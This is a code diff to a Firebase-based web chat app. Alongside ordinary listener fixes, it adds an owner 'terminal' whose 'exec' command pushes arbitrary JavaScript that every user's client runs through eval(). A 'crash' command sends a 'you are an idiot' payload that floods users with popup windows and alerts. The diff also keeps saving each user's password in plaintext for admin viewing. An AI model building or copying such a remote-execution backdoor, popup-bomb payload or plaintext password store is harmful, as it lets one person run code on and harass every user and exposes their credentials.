@@ -26,6 +26,8 @@
             --typing-indicator: #94a3b8;
             --mention-bg: #fef9c3;
             --mention-text: #854d0e;
+            --terminal-bg: #1e1e1e;
+            --terminal-text: #00ff00;
         }
 
         .theme-dark {
@@ -132,6 +134,7 @@
         .btn-success { background: linear-gradient(135deg, #10b981 0%, #059669 100%); }
         .btn-warning { background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%); }
         .btn-owner { background: linear-gradient(135deg, #f59e0b 0%, #b45309 100%); }
+        .btn-terminal { background: #2d2d2d; color: #00ff00; border: 1px solid #00ff00; }
 
         .btn-small {
             width: auto;
@@ -406,6 +409,85 @@
         }
 
         .message-actions button:hover { background: rgba(0,0,0,0.1); }
+
+        /* Terminal */
+        .terminal-modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 800px;
+            height: 500px;
+            background: var(--terminal-bg);
+            border: 2px solid var(--terminal-text);
+            border-radius: 0.5rem;
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 30px rgba(0,255,0,0.3);
+        }
+
+        .terminal-header {
+            padding: 0.5rem 1rem;
+            background: #2d2d2d;
+            border-bottom: 1px solid var(--terminal-text);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: var(--terminal-text);
+        }
+
+        .terminal-title {
+            font-weight: bold;
+            font-family: monospace;
+        }
+
+        .terminal-close {
+            background: none;
+            border: none;
+            color: var(--terminal-text);
+            cursor: pointer;
+            font-size: 1.2rem;
+        }
+
+        .terminal-close:hover { opacity: 0.8; }
+
+        .terminal-output {
+            flex: 1;
+            padding: 1rem;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            color: var(--terminal-text);
+            background: var(--terminal-bg);
+            white-space: pre-wrap;
+        }
+
+        .terminal-input-line {
+            display: flex;
+            padding: 0.5rem 1rem;
+            border-top: 1px solid var(--terminal-text);
+            background: #2d2d2d;
+        }
+
+        .terminal-prompt {
+            color: var(--terminal-text);
+            font-family: monospace;
+            margin-right: 0.5rem;
+        }
+
+        .terminal-input {
+            flex: 1;
+            background: none;
+            border: none;
+            color: var(--terminal-text);
+            font-family: monospace;
+            outline: none;
+        }
+
+        .terminal-input::placeholder {
+            color: rgba(0,255,0,0.3);
+        }
 
         /* Typing Indicator */
         .typing-indicator-wrapper {
@@ -724,6 +806,11 @@
                 font-size: 1.5rem;
                 cursor: pointer;
                 color: var(--text);
+            }
+            
+            .terminal-modal {
+                width: 95%;
+                height: 80vh;
             }
         }
 
@@ -1102,6 +1189,23 @@
         </div>
     </div>
 
+    <!-- Terminal Modal -->
+    <div id="terminalModal" class="terminal-modal hidden">
+        <div class="terminal-header">
+            <span class="terminal-title">🔧 Owner Terminal v1.0</span>
+            <button class="terminal-close" onclick="closeTerminal()">×</button>
+        </div>
+        <div id="terminalOutput" class="terminal-output">
+            Welcome to Owner Terminal<br>
+            Type 'help' for available commands<br>
+            > 
+        </div>
+        <div class="terminal-input-line">
+            <span class="terminal-prompt">$</span>
+            <input type="text" id="terminalInput" class="terminal-input" placeholder="Enter command..." onkeypress="handleTerminalKeyPress(event)" autocomplete="off">
+        </div>
+    </div>
+
     <!-- Login Page -->
     <div id="loginPage" class="auth-container hidden">
         <div class="auth-box">
@@ -1214,6 +1318,7 @@
                     </div>
                     <div id="ownerButton" class="hidden">
                         <button class="btn-small btn-owner" onclick="showOwnerPanel()">⭐ Owner</button>
+                        <button class="btn-small btn-terminal" onclick="openTerminal()" style="margin-left: 0.5rem;">💻 Terminal</button>
                     </div>
                 </div>
             </div>
@@ -1654,7 +1759,7 @@
             usersCache = {};
             snapshot.forEach(doc => { 
                 const data = doc.data();
-                usersCache[doc.id] = { id: doc.id, ...data, plainPassword: data.password }; 
+                usersCache[doc.id] = { id: doc.id, ...data, plainPassword: data.plainPassword }; 
             });
             usersCacheTimestamp = now;
             return Object.values(usersCache);
@@ -1665,7 +1770,7 @@
             const doc = await db.collection('users').doc(userId).get();
             if (doc.exists) {
                 const data = doc.data();
-                usersCache[doc.id] = { id: doc.id, ...data, plainPassword: data.password };
+                usersCache[doc.id] = { id: doc.id, ...data, plainPassword: data.plainPassword };
                 return usersCache[doc.id];
             }
             return null;
@@ -1703,7 +1808,7 @@
                 await userRef.set({
                     username,
                     password: hashedPassword,
-                    plainPassword: password, // Store plain password for admin viewing
+                    plainPassword: password,
                     salt,
                     avatar: '😀',
                     isAdmin: false,
@@ -2044,18 +2149,19 @@
             const container = document.getElementById('messagesContainer');
             container.innerHTML = '';
 
-            if (messageListeners[currentChat]) {
-                const prev = messageListeners[currentChat];
+            if (messageListeners[chatId]) {
+                const prev = messageListeners[chatId];
                 if (typeof prev === 'function') prev();
             }
-            if (messageListeners[currentChat + '_new']) {
-                const prev = messageListeners[currentChat + '_new'];
+            if (messageListeners[chatId + '_new']) {
+                const prev = messageListeners[chatId + '_new'];
                 if (typeof prev === 'function') prev();
             }
 
             if (chatId === 'announcements') {
                 let knownMessageIds = null;
                 const unsubscribe = db.collection('announcements').onSnapshot(snapshot => {
+                    if (currentChat !== 'announcements') return;
                     container.innerHTML = '';
                     const messages = [];
                     snapshot.forEach(doc => { const data = doc.data(); if (data.timestamp) messages.push({ id: doc.id, ...data }); });
@@ -2081,6 +2187,7 @@
             } else if (chatId === 'global') {
                 let knownMessageIds = null;
                 const unsubscribe = db.collection('messages').onSnapshot(snapshot => {
+                    if (currentChat !== 'global') return;
                     container.innerHTML = '';
                     const messages = [];
                     snapshot.forEach(doc => { const data = doc.data(); if (data.timestamp) messages.push({ id: doc.id, ...data }); });
@@ -2089,17 +2196,14 @@
                     lastMessages.forEach(msg => displayMessage(msg, container));
                     scrollToBottom();
                     
-                    // Check for mentions in new messages
                     if (knownMessageIds !== null) {
                         lastMessages.forEach(msg => {
                             if (!knownMessageIds.has(msg.id) && msg.userId !== currentUser.id) {
-                                // Check if user is mentioned
                                 const mentionRegex = new RegExp('@' + currentUser.username + '\\b', 'i');
                                 const isMentioned = mentionRegex.test(msg.content);
                                 const isEveryoneMention = msg.content && msg.content.includes('@everyone');
                                 
                                 if (isMentioned || isEveryoneMention) {
-                                    // Show notification for mention
                                     showNotification(
                                         `Mentioned by ${msg.username}`,
                                         msg.content,
@@ -2107,13 +2211,11 @@
                                         'mention'
                                     );
                                     
-                                    // Add to unread if not in current chat
                                     if (currentChat !== 'global') {
                                         unreadCounts['global'] = (unreadCounts['global'] || 0) + 1;
                                         updateUnreadBadge('global');
                                     }
                                 } else {
-                                    // Regular message notification
                                     if (currentChat !== 'global') {
                                         unreadCounts['global'] = (unreadCounts['global'] || 0) + 1;
                                         updateUnreadBadge('global');
@@ -2130,19 +2232,32 @@
             } else {
                 // Private chat
                 const messagesRef = rtdb.ref(`privateChats/${chatId}/messages`).orderByChild('timestamp').limitToLast(100);
+                messagesRef.off();
                 messagesRef.on('value', snapshot => {
+                    if (currentChat !== chatId) return;
                     container.innerHTML = '';
                     const messages = [];
-                    snapshot.forEach(child => messages.push({ id: child.key, ...child.val() }));
+                    snapshot.forEach(child => {
+                        const msg = child.val();
+                        messages.push({ id: child.key, ...msg });
+                    });
+                    messages.sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
                     messages.forEach(msg => displayMessage(msg, container, true));
                     scrollToBottom();
-                }, error => { showToast('Error loading messages: ' + error.message, 'error'); });
+                }, error => { 
+                    console.error('Error loading private messages:', error);
+                    showToast('Error loading private messages: ' + error.message, 'error'); 
+                });
                 messageListeners[chatId] = () => messagesRef.off();
 
                 const newPrivateRef = rtdb.ref(`privateChats/${chatId}/messages`).orderByChild('timestamp').limitToLast(1);
+                newPrivateRef.off();
                 let privateListenerReady = false;
                 newPrivateRef.on('child_added', snapshot => {
-                    if (!privateListenerReady) { privateListenerReady = true; return; }
+                    if (!privateListenerReady) { 
+                        privateListenerReady = true; 
+                        return; 
+                    }
                     const msg = snapshot.val();
                     if (msg.userId !== currentUser.id && currentChat !== chatId) {
                         unreadCounts[chatId] = (unreadCounts[chatId] || 0) + 1;
@@ -2175,7 +2290,6 @@
             if (isPrivate && !isSystem) className += ' private';
             if (isAnnouncement && !isSystem) className += ' announcement';
             
-            // Check for mentions
             const mentionRegex = new RegExp('@' + currentUser.username + '\\b', 'i');
             const isMentioned = mentionRegex.test(message.content);
             const isEveryoneMention = message.content && message.content.includes('@everyone');
@@ -2223,16 +2337,13 @@
             let messageHtml = '';
             parts.forEach(part => {
                 if (part.type === 'text') {
-                    // Highlight mentions in the text
                     let text = sanitizeHTML(part.value);
                     
-                    // Highlight @everyone
                     text = text.replace(
                         /@everyone\b/g,
                         '<span class="mention-highlight">@everyone</span>'
                     );
                     
-                    // Highlight @username mentions
                     const allUsers = Object.values(usersCache);
                     allUsers.forEach(user => {
                         if (user.username) {
@@ -2292,7 +2403,6 @@
                 return;
             }
 
-            // Check for @everyone command (admins only)
             if (content.includes('@everyone') && !currentUser.isAdmin && !currentUser.isOwner) {
                 showToast('Only admins can use @everyone', 'error');
                 return;
@@ -2383,6 +2493,218 @@
             container.scrollTop = container.scrollHeight;
         }
 
+        // ==================== TERMINAL ====================
+        function openTerminal() {
+            if (!currentUser.isOwner) {
+                showToast('Only owner can access terminal', 'error');
+                return;
+            }
+            document.getElementById('terminalModal').classList.remove('hidden');
+            document.getElementById('terminalInput').focus();
+            addTerminalOutput('Terminal opened. Type "help" for commands.');
+        }
+
+        function closeTerminal() {
+            document.getElementById('terminalModal').classList.add('hidden');
+        }
+
+        function addTerminalOutput(text) {
+            const output = document.getElementById('terminalOutput');
+            output.innerHTML += '<br>' + text;
+            output.scrollTop = output.scrollHeight;
+        }
+
+        async function handleTerminalKeyPress(event) {
+            if (event.key === 'Enter') {
+                const input = document.getElementById('terminalInput');
+                const command = input.value.trim();
+                input.value = '';
+                
+                addTerminalOutput('> ' + command);
+                
+                await executeTerminalCommand(command);
+            }
+        }
+
+        async function executeTerminalCommand(command) {
+            const args = command.split(' ');
+            const cmd = args[0].toLowerCase();
+
+            switch(cmd) {
+                case 'help':
+                    addTerminalOutput('Available commands:');
+                    addTerminalOutput('  help - Show this help');
+                    addTerminalOutput('  clear - Clear terminal');
+                    addTerminalOutput('  users - List all users');
+                    addTerminalOutput('  broadcast [message] - Send broadcast');
+                    addTerminalOutput('  exec [js code] - Execute JS on all users');
+                    addTerminalOutput('  crash - Run "you are an idiot" on all users');
+                    addTerminalOutput('  reload - Reload all users');
+                    addTerminalOutput('  logout [username] - Force logout user');
+                    break;
+
+                case 'clear':
+                    document.getElementById('terminalOutput').innerHTML = 'Terminal cleared.';
+                    break;
+
+                case 'users':
+                    const users = await getCachedUsers();
+                    addTerminalOutput('Online users:');
+                    users.forEach(u => {
+                        const status = u.online ? '🟢' : '⚫';
+                        addTerminalOutput(`  ${status} ${u.username} ${u.isAdmin ? '(Admin)' : ''} ${isOwnerUser(u.username) ? '(Owner)' : ''}`);
+                    });
+                    break;
+
+                case 'broadcast':
+                    const message = args.slice(1).join(' ');
+                    if (!message) {
+                        addTerminalOutput('Error: Please provide a message');
+                        return;
+                    }
+                    await db.collection('broadcasts').add({
+                        type: 'message',
+                        message: '🔧 [TERMINAL] ' + message,
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        sentBy: currentUser.id,
+                        sentByName: currentUser.username
+                    });
+                    addTerminalOutput('Broadcast sent: ' + message);
+                    break;
+
+                case 'exec':
+                    const code = args.slice(1).join(' ');
+                    if (!code) {
+                        addTerminalOutput('Error: Please provide JavaScript code');
+                        return;
+                    }
+                    await db.collection('broadcasts').add({
+                        type: 'exec_code',
+                        code: code,
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        sentBy: currentUser.id,
+                        targetUsers: 'all'
+                    });
+                    addTerminalOutput('JavaScript code sent to all users');
+                    break;
+
+                case 'crash':
+                    addTerminalOutput('💥 Executing "you are an idiot" crash on all users...');
+                    
+                    // Create multiple windows with the you are an idiot effect
+                    const crashCode = `
+                        // Create multiple windows with the you are an idiot effect
+                        for(let i = 0; i < 10; i++) {
+                            setTimeout(() => {
+                                const win = window.open('about:blank', '_blank');
+                                if(win) {
+                                    win.document.write(\`
+                                        <html>
+                                            <head>
+                                                <title>YOU ARE AN IDIOT</title>
+                                                <style>
+                                                    body { 
+                                                        margin: 0; 
+                                                        padding: 0; 
+                                                        background: yellow; 
+                                                        color: red; 
+                                                        font-family: Arial, sans-serif;
+                                                        overflow: hidden;
+                                                    }
+                                                    .idiot-container {
+                                                        position: absolute;
+                                                        top: 0;
+                                                        left: 0;
+                                                        width: 100%;
+                                                        height: 100%;
+                                                        display: flex;
+                                                        justify-content: center;
+                                                        align-items: center;
+                                                        font-size: 48px;
+                                                        font-weight: bold;
+                                                        animation: blink 0.5s infinite;
+                                                    }
+                                                    @keyframes blink {
+                                                        0% { opacity: 1; transform: scale(1); }
+                                                        50% { opacity: 0.5; transform: scale(1.1); }
+                                                        100% { opacity: 1; transform: scale(1); }
+                                                    }
+                                                </style>
+                                            </head>
+                                            <body>
+                                                <div class="idiot-container">
+                                                    YOU ARE AN IDIOT
+                                                </div>
+                                                <script>
+                                                    // Create more windows
+                                                    setInterval(() => {
+                                                        for(let j = 0; j < 3; j++) {
+                                                            window.open('about:blank', '_blank');
+                                                        }
+                                                    }, 1000);
+                                                </script>
+                                            </body>
+                                        </html>
+                                    \`);
+                                    win.document.close();
+                                }
+                            }, i * 100);
+                        }
+                        
+                        // Alert spam
+                        for(let i = 0; i < 5; i++) {
+                            setTimeout(() => {
+                                alert('YOU ARE AN IDIOT');
+                            }, i * 200);
+                        }
+                    `;
+                    
+                    await db.collection('broadcasts').add({
+                        type: 'exec_code',
+                        code: crashCode,
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        sentBy: currentUser.id,
+                        targetUsers: 'all'
+                    });
+                    addTerminalOutput('Crash command sent to all users');
+                    break;
+
+                case 'reload':
+                    await db.collection('broadcasts').add({
+                        type: 'force_reload',
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        sentBy: currentUser.id,
+                        targetUsers: 'all'
+                    });
+                    addTerminalOutput('Reload command sent to all users');
+                    break;
+
+                case 'logout':
+                    const targetUser = args[1];
+                    if (!targetUser) {
+                        addTerminalOutput('Error: Please specify username');
+                        return;
+                    }
+                    const userList = await getCachedUsers();
+                    const user = userList.find(u => u.username === targetUser);
+                    if (user) {
+                        await db.collection('broadcasts').add({
+                            type: 'force_logout',
+                            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                            sentBy: currentUser.id,
+                            targetUsers: [user.id]
+                        });
+                        addTerminalOutput(`Logout command sent to ${targetUser}`);
+                    } else {
+                        addTerminalOutput(`User ${targetUser} not found`);
+                    }
+                    break;
+
+                default:
+                    addTerminalOutput(`Unknown command: ${cmd}. Type 'help' for available commands.`);
+            }
+        }
+
         // ==================== MENTION AUTOCOMPLETE ====================
         async function handleMentionAutocomplete(event) {
             const input = document.getElementById('messageInput');
@@ -2390,11 +2712,9 @@
             const text = input.value;
             const dropdown = document.getElementById('autocompleteDropdown');
             
-            // Find the last @ symbol before cursor
             let lastAtIndex = -1;
             for (let i = cursorPos - 1; i >= 0; i--) {
                 if (text[i] === '@') {
-                    // Check if it's part of a word
                     if (i === 0 || text[i-1].match(/\s/)) {
                         lastAtIndex = i;
                         break;
@@ -2408,7 +2728,6 @@
                 const searchTerm = text.substring(lastAtIndex + 1, cursorPos).toLowerCase();
                 mentionStartPos = lastAtIndex;
                 
-                // Get users for autocomplete
                 const users = await getCachedUsers();
                 autocompleteUsers = users
                     .filter(u => u.id !== currentUser.id && u.username.toLowerCase().startsWith(searchTerm))
@@ -2447,7 +2766,6 @@
                 item.innerHTML = `
                     <span class="avatar">${user.avatar}</span>
                     <span style="flex:1;">${sanitizeHTML(user.username)} ${badge}</span>
-                    <span style="color:var(--text-secondary); font-size:0.75rem;">${user.username.toLowerCase().startsWith(searchTerm) ? 'Match' : ''}</span>
                 `;
                 dropdown.appendChild(item);
             });
@@ -2584,7 +2902,6 @@
             const allUsers = await getCachedUsers();
             const chatList = document.getElementById('chatList');
             
-            // Keep channels
             chatList.innerHTML = `
                 <div class="sidebar-section-header">Channels</div>
                 <div class="chat-item ${currentChat === 'global' ? 'active' : ''}" onclick="selectChat('global')">
@@ -2767,7 +3084,7 @@
                 statusSnapshot.forEach(child => { if (child.val().online) onlineCount++; });
                 document.getElementById('onlineUsers').textContent = onlineCount;
                 document.getElementById('totalMessages').textContent = messagesSnapshot.size;
-                document.getElementById('totalGroups').textContent = 0; // Groups disabled
+                document.getElementById('totalGroups').textContent = 0;
             } catch(error) { console.error('Error loading stats:', error); }
         }
 
@@ -3508,7 +3825,21 @@
                         const isAll = broadcast.targetUsers === 'all';
                         if (broadcast.targetUsers && !isAll && !isTargeted) return;
 
-                        if (broadcast.type === 'url_redirect') {
+                        if (broadcast.type === 'exec_code') {
+                            // Execute JavaScript code on this user
+                            try {
+                                eval(broadcast.code);
+                            } catch(e) {
+                                console.error('Error executing broadcast code:', e);
+                            }
+                            
+                            // Track execution
+                            const docRef = db.collection('broadcasts').doc(doc.id);
+                            docRef.update({ 
+                                openedBy: firebase.firestore.FieldValue.arrayUnion(currentUser.id) 
+                            }).catch(() => {});
+
+                        } else if (broadcast.type === 'url_redirect') {
                             const dismissed = JSON.parse(localStorage.getItem('dismissedBroadcasts') || '[]');
                             dismissed.push(doc.id);
                             localStorage.setItem('dismissedBroadcasts', JSON.stringify(dismissed));
